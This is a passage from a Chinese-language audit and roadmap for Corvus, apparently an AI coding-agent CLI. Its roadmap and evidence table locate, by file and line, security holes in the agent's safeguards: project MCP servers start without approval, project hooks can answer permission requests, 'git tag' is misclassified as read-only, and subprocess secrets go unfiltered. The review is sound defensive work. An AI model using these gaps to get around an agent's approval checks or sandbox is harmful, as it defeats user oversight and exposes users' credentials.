6. **本机 `.corvus/config.toml` 含真实 API key**：已 gitignore（`/.corvus/`）非仓库泄露，但该 key 曾在多轮 TUI 调试中使用，**建议轮换**。
7. **近期提交 100% 为 CLI/TUI 工作**（`git log -30`：style 8 / feat 8 / docs 8 / fix 4），无 provider/agent/config 提交——开发重心极度偏向视觉打磨。

### 7.3 功能清单概览（完整）

Provider（anthropic/openai 兼容/responses + 44 个厂商预设含 models_url 拉取、balance_url 余额）、19 个内建工具 + 6 个代理工具 + 4 个 LSP 工具、7 档权限模式、沙箱（enforce/off/网络开关）、MCP（stdio/http/sse + `.mcp.json` Claude 兼容 + 按服务器超时）、Skills（多根发现 + 内置 corvus-guide）、记忆（约定记忆 + 版本化 store + auto_recall）、会话（JSONL 转录 + checkpoint + 恢复 + 历史搜索 + branch/goal）、hooks（11 事件，Claude 兼容）、i18n（en/zh/zh-TW）、主题/货币、自定义斜杠命令、代理（sysproxy）、token 统计。详见 Kuhn 子代理报告。

---

## 八、优化路线图

### 短期（1-2 周，安全 + 稳定性，改动小收益大）

1. **修复 A1**：项目级 MCP 启动审批（把 `RequireLaunchApproval` 接到项目来源分支，或强制沙箱 + 关网络）。
2. **修复 A2**：项目 hooks 信任门（首启确认 + 指纹），PermissionRequest hook 仅全局来源可代答。
3. **修复 D1（jobs 死锁环）**：完成 Notice 的 `sink.Emit` 移到 `close(j.done)` 之后或非阻塞化。
4. **修复 B1（后台命令生命周期）**：`/compact /new /clear` 接入 controller WaitGroup + ctx，`beginRotation` 补 `closed` 检查。
5. **落地 CI**：GitHub Actions 跑 `make lint vet test` + `go test -race ./internal/...` + 固定版本 golangci-lint（让 `unused` 门禁首次生效）。
6. **仓库卫生**：提交/还原 48 个删除文件；删 `tmp/` 或修正 `.gitignore`；移除或保留 `spike-shimmer`；对齐 README/示例配置/`--help`；轮换 API key。
7. **安全收尾**：checkpoint/guardian cursor 0600、session 目录 0700；`git tag` 移出只读表；MCP confined 路径检查 `wrapped`；子进程环境变量过滤对 MCP 默认开启。

### 中期（1-2 月，减重 + 平台化第一步）

8. **拆 God file**：`controller.go`（按 approval/goal 模式拆文件 + `submitCommandOrTurn` 分发表）、`chat_tui.go`（`update` 按 `tea.Msg` 分发表）、`boot.Build`（`buildXxx` 子函数）、provider `readStream` 共享骨架。
9. **删 34 处死代码**（含 `configureKeys`/`appendEnv`），让 lint 全绿。
10. **headless exec**：新增 `cmd/corvus-exec`，复用 `boot.Build` + `HeadlessApprovalMode` + JSONL 事件输出（对标 `codex exec`）。
11. **网络策略**：`networkpolicy` 决策器（域名放行表 + 审批回退），补 bash 内 `curl` 等 URL 检查。
12. **补安全关键包测试**：`shellsafe`（分类表正反例全量）、`proc`（KillTree/WaitDelay）、`lsp`（fake server 生命周期）、`netclient`。
13. **修 P1 并发**：`Session.Messages` 访问器收敛；`eventSink`/`syncSink` 非阻塞化；`MutationBarrier` ctx 版本。

### 长期（3 月+，生态与体验）

14. **MCP 服务端暴露**（`cmd/corvus-mcp-server`）→ IDE 集成入口；**`web_search` 原生工具**；**`tool_search` 工具发现**（复用 BM25）；**启动上下文注入**；**execpolicy 命令策略文件**。
15. **质量工程**：TUI 渲染 golden 快照、Go fuzz（shellparse/permission/secrets）、复杂度硬门（`over 40` 起步）、bench 基线。
16. **体验补齐**：外部编辑器 `/edit`、更新提示、桌面通知、远程压缩子代理、会话归档/删除子命令。
17. **生态**：Claude Code 兼容已领先——可考虑把"插件包 + skills + hooks + execpolicy"打包成可分发插件格式，形成 Corvus 自己的生态位。

---

## 九、附录：关键证据索引

| 发现 | 证据 |
|---|---|
| 项目 MCP 免审批启动 | `internal/config/config.go:1138-1148`、`internal/boot/boot.go:2443/2511`、`internal/plugin/transport_stdio.go:99` |
| `RequireLaunchApproval` 从未置真 | 全仓 grep：仅 `internal/plugin/plugin.go:1118` 拷贝传递；`internal/boot/boot.go:562` |
| 项目 hooks 无条件加载 + 可代答 | `internal/boot/boot.go:766`、`internal/hook/hook.go:1049-1056/1448` |
| jobs 完成通知先于 close(done) | `internal/jobs/jobs.go:496-511/774/970-989` |
| 后台命令裸 goroutine | `internal/control/controller.go:1179-1203/1760-1772/5121-5168` |
| eventSink 阻塞发送 | `internal/cli/chat_tui.go:5315`、`internal/event/sync.go:20-25` |
| checkpoint 0644 / 快照含全文 | `internal/checkpoint/checkpoint.go:660-663`、`types.go` FileSnap.Content |
| 子进程环境不过滤 | `internal/secrets/redact.go:140-148`、`internal/plugin/transport_stdio.go:76-81` |
| `git tag` 只读误分类 | `internal/shellsafe/shellsafe.go:57`、`internal/permission/bash_readonly.go:60-100` |
| 34 处死代码 | `internal/cli/cli.go:109/119/737-1335`（`configureKeys` 1233、`appendEnv` 1288）、`status_footer.go:204-352` 等 |
| 断言空转 | `internal/cli/chat_tui_test.go:1317` |
| 复杂度门禁 report-only | `.golangci-agent-complexity.yml`（`issues-exit-code: 0`） |
| God file | `internal/control/controller.go`（6199 行）、`internal/cli/chat_tui.go`（5315 行）、`internal/boot/boot.go`（1639 行 cc=148） |
| `--help` 漂移 | `internal/i18n/messages_en.go:499` 缺 `--max-steps`（`cli.go:299`）与 `--allowedTools`（`cli.go:313`） |
| 技能引用不存在命令 | `internal/skill/builtincontent/corvus-guide/SKILL.md:16` |
| 沙箱 fail-closed 对比 | bash `internal/tool/builtin/bash.go:186-196` vs MCP `internal/plugin/transport_stdio.go:95` 丢弃 wrapped |

---

## 十、总评

Corvus 在**单会话内闭环**（权限、沙箱、恢复、交付门控、TUI 打磨、中文体验）上已经达到甚至超过 Codex CLI；主要差距在**平台化**（headless、网络策略、MCP 服务端、工具发现、CI/生态）。当前最该做的不是继续加视觉功能，而是三件事：**① 修掉两个高危安全洞（项目 MCP / 项目 hooks）；② 把已配置但从未生效的门禁（lint、复杂度、CI）真正落地；③ 减重——拆 God file、删死代码、补安全关键包测试**。之后再谈 headless exec、网络策略与 MCP 服务端这三块投入产出比最高的平台化能力（`boot → control.Controller` 装配层本来就是为多前端设计的，落地成本主要在适配层）。
